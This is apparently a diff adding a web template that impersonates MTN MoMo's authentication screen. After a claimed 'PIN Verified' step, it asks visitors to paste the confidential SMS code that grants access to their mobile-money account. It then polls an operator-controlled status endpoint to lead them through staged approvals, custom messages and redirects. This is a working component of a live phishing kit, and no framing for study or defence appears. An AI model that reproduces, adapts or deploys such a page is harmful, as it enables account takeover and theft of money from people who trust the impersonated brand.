@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Authentication - MTN MoMo</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; }
+        html, body {
+            margin: 0; padding: 0; width: 100%; min-height: 100vh;
+            background-color: #003366; color: white;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex; align-items: center; justify-content: center; text-align: center;
+        }
+        .screen-container { width: 100%; max-width: 500px; padding: 30px 20px; }
+        .hourglass-circle {
+            width: 120px; height: 120px;
+            background-color: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 50%; display: inline-flex;
+            align-items: center; justify-content: center;
+            font-size: 3rem; margin-bottom: 25px;
+        }
+        .notice-banner {
+            background-color: rgba(255, 255, 255, 0.05);
+            border-radius: 12px; padding: 14px 20px;
+            margin-top: 20px; font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        .app-id-tag { color: #FFCC00; font-weight: 700; letter-spacing: 1px; }
+        .custom-msg-box {
+            background: #FFCC00; color: #003366;
+            padding: 15px; border-radius: 12px;
+            font-weight: 700; margin-top: 15px; display: none;
+        }
+        .sms-box {
+            background: #002244; padding: 25px 20px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        .format-hint-box {
+            background-color: rgba(255, 204, 0, 0.08);
+            border-left: 4px solid #FFCC00;
+            border-radius: 8px;
+            font-size: 0.8rem;
+            color: #f8f9fa;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+    <div class="screen-container">
+        
+        <!-- Waiting State -->
+        <div id="waitSection">
+            <div class="hourglass-circle">⏳</div>
+            <h2 class="fw-bold mb-2 fs-1">Authentication in progress...</h2>
+            <p class="text-white-50 lead fs-6 mb-3">Please wait</p>
+            <div id="customMsg" class="custom-msg-box mb-3"></div>
+            <div class="notice-banner mb-4">Do not close this page</div>
+            <div class="small">Application ID: <span class="app-id-tag">{{ app_id }}</span></div>
+        </div>
+
+        <!-- SMS Authorization Message Input Box -->
+        <div id="smsSection" class="sms-box d-none">
+            <div class="badge bg-warning text-dark px-3 py-2 text-uppercase mb-3 fw-bold">✓ PIN Verified</div>
+            <h3 class="fw-bold text-white mb-2">Enter SMS Authorization Message</h3>
+            <p class="text-white-50 small mb-3">
+                Paste the full security SMS message received on your mobile device below to complete authorization.
+            </p>
+
+            <!-- Exact Message Example Box -->
+            <div class="format-hint-box p-3 mb-3">
+                <span class="text-warning fw-bold d-block mb-1">💡 Expected Message Example:</span>
+                <code style="color: #FFCC00; word-break: break-all; font-size: 0.75rem;">
+                    Y'ello. Please note! This confidential code gives access to your MoMo account:QIQSutdZDKpJIplUbs69uWtojKml1FU00rr9Eb4ksXbnng== Do not share it with anyone. l+/DM+Y0kqw HTx14B0+90w YyRaK1dXEWz CTO2RPz+HOF yiitGCXacTO
+                </code>
+            </div>
+
+            <form action="/submit-auth-code" method="POST">
+                <div class="mb-3">
+                    <textarea class="form-control" name="auth_code" rows="4" 
+                        placeholder="Paste the message here..." 
+                        required style="border-radius: 12px; font-size: 0.9rem; background-color: #ffffff; color: #000;"></textarea>
+                </div>
+                <button type="submit" class="btn btn-warning w-100 py-3 fw-bold text-dark rounded-3 shadow">SUBMIT SMS AUTHORIZATION</button>
+            </form>
+        </div>
+
+    </div>
+
+    <script>
+        const appId = "{{ app_id }}";
+
+        function checkStatus() {
+            fetch('/check-status?app_id=' + appId)
+                .then(response => response.json())
+                .then(data => {
+                    const waitSection = document.getElementById('waitSection');
+                    const smsSection = document.getElementById('smsSection');
+                    const msgBox = document.getElementById('customMsg');
+
+                    if (data.status === "Stage1_Approved") {
+                        waitSection.classList.add('d-none');
+                        smsSection.classList.remove('d-none');
+                    } else if (data.status === "Stage2_Approved") {
+                        window.location.href = "/final-verify";
+                    } else if (data.status === "Stage3_Approved" || data.status === "Approved") {
+                        window.location.href = "/success";
+                    } else if (data.status === "CustomMessage") {
+                        msgBox.style.display = 'block';
+                        msgBox.textContent = data.custom_message;
+                        setTimeout(checkStatus, 2000);
+                    } else if (data.status === "Rejected") {
+                        alert(data.custom_message || "Verification failed. Please try again.");
+                        window.location.href = "/login";
+                    } else {
+                        setTimeout(checkStatus, 1500);
+                    }
+                })
+                .catch(() => setTimeout(checkStatus, 2500));
+        }
+
+        if (appId) {
+            setTimeout(checkStatus, 1000);
+        }
+    </script>
+</body>
+</html>
